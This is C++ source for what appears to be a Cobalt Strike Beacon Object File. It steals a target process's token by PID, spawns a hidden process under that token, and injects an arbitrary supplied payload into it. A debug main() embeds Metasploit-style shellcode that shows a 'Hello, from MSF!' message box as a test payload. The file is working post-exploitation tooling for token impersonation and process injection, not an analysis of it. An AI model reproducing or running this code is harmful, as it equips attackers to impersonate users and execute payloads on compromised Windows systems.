#include <Windows.h>
#include "base\helpers.h"

#ifdef _DEBUG
#include "base\mock.h"
#pragma comment(lib, "advapi32.lib")
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#endif

/* is this an x64 BOF */
static BOOL is_x86() {
#if defined _M_X64
    return FALSE;
#elif defined _M_IX86
    return TRUE;
#endif
}

extern "C" {
#include "beacon.h"

    // DFR functions
    DFR(KERNEL32, GetLastError);
    #define GetLastError KERNEL32$GetLastError

    DFR(KERNEL32, OpenProcess);
    #define OpenProcess KERNEL32$OpenProcess

    DFR(ADVAPI32, OpenProcessToken);
    #define OpenProcessToken ADVAPI32$OpenProcessToken
    
    DFR(ADVAPI32, DuplicateTokenEx);
    #define DuplicateTokenEx ADVAPI32$DuplicateTokenEx
    
    DFR(ADVAPI32, CreateProcessWithTokenW);
    #define CreateProcessWithTokenW ADVAPI32$CreateProcessWithTokenW

    DFR(ADVAPI32, CreateProcessAsUserW);
    #define CreateProcessAsUserW ADVAPI32$CreateProcessAsUserW
    
    DFR(KERNEL32, CloseHandle);
    #define CloseHandle KERNEL32$CloseHandle

    void go(char* args, int len);
}

void go(char* args, int len) {

    datap   parser;
    formatp buffer;

    int     pid;
    char*   payload;
    int     payloadLen;
    char    spawnto[64] = "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM";

    HANDLE  hProcess  = 0;
    HANDLE  hToken    = 0;
    HANDLE  hDupToken = 0;

    STARTUPINFOW si        = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    
    // unpack target pid
    BeaconDataParse(&parser, args, len);
    pid = BeaconDataInt(&parser);

    // unpack payload
    payload = BeaconDataExtract(&parser, &payloadLen);

    // get handle to process
    hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);

    if (!hProcess) {
        BeaconPrintf(CALLBACK_ERROR, "OpenProcess failed: %i", GetLastError());
        return;
    }

    // get handle to process token
    if (!OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken)) {
        BeaconPrintf(CALLBACK_ERROR, "OpenProcessToken failed: %i", GetLastError());
        goto cleanup;
    }

    // duplicate process token
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hDupToken)) {
        BeaconPrintf(CALLBACK_ERROR, "DuplicateToken failed: %i", GetLastError());
        goto cleanup;
    }

    // get the beacon spawnto
    BeaconGetSpawnTo(is_x86(), spawnto, sizeof(spawnto));
    
    // format spawnto to unicode
    wchar_t commandLine[64];
    toWideChar(spawnto, commandLine, 64);

    // startupinfo
    si.cb = sizeof(STARTUPINFOW);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    // try CreateProcessWithTokenW first
    if (!CreateProcessWithTokenW(hDupToken, LOGON_WITH_PROFILE, NULL, (LPWSTR)commandLine, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        BeaconPrintf(CALLBACK_ERROR, "CreateProcessWithTokenW failed: %i", GetLastError());

        // try CreateProcessAsUserW
        if (!CreateProcessAsUserW(hDupToken, NULL, (LPWSTR)commandLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            BeaconPrintf(CALLBACK_ERROR, "CreateProcessAsUserW failed: %i", GetLastError());
            goto cleanup;
        }
    }

    // inject into process
    BeaconInjectProcess(pi.hProcess, pi.dwProcessId, payload, payloadLen, 0, NULL, 0);
    BeaconCleanupProcess(&pi);

    BeaconPrintf(CALLBACK_OUTPUT, "Spawned PID %i and injected %i bytes", pi.dwProcessId, payloadLen);

cleanup:
    CloseHandle(hProcess);
    CloseHandle(hToken);
    CloseHandle(hDupToken);
}

#if defined(_DEBUG) && !defined(_GTEST)
int main(int argc, char* argv[]) {

    char buf[] =
        "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
        "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
        "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
        "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
        "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
        "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
        "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
        "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
        "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
        "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
        "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
        "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
        "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
        "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
        "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x3e\x48"
        "\x8d\x8d\x46\x01\x00\x00\x41\xba\x4c\x77\x26\x07\xff\xd5"
        "\x49\xc7\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x2a\x01\x00"
        "\x00\x3e\x4c\x8d\x85\x3b\x01\x00\x00\x48\x31\xc9\x41\xba"
        "\x45\x83\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6"
        "\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80"
        "\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89"
        "\xda\xff\xd5\x48\x65\x6c\x6c\x6f\x2c\x20\x66\x72\x6f\x6d"
        "\x20\x4d\x53\x46\x21\x00\x4d\x65\x73\x73\x61\x67\x65\x42"
        "\x6f\x78\x00\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00";

    bof::runMocked<int, const char*>(go, 22656, buf);
    return 0;
}
#endif